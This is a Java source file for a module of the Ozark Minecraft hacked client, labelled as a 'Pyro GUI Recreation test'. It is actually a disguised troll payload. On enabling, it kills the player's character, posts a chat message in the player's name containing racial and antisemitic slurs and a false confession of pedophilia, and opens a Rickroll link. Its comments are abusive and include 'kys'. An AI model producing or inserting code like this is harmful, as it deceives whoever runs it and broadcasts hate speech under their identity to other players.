package me.trambled.ozark.ozarkclient.module.gui;

import me.trambled.ozark.Ozark;
import me.trambled.ozark.ozarkclient.module.Category;
import me.trambled.ozark.ozarkclient.module.Module;
import me.trambled.ozark.ozarkclient.module.Setting;
import java.awt.*;
import java.net.URI;
import me.trambled.ozark.ozarkclient.util.MessageUtil;

//ultimate troll module by profkambing :trollface: cope more idiots!!!
//such a shit troll kys
public class PyroGUI extends Module {
    public PyroGUI() {
        super(Category.GUI);

        this.name = "PyroGUI";
        this.tag = "TrollModule";
        this.description = "Pyro GUI Recreation test (cant customize colors yet)";
        this.toggle_message = false;
    }

    public void enable() {
        if (mc.player != null)
            MessageUtil.send_client_message("EZZZ KID COPE MORE HAHAHAHAHHA GOTEM");
        mc.player.sendChatMessage("/kill");
        mc.player.sendChatMessage("I am a pedophile, a larper, a newfag, a fitfag, a nigger, a jew, and a retard");
           try {
                Desktop.getDesktop().browse(URI.create("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
            } catch (Exception ignored) {
           }
        set_disable();
    }
}


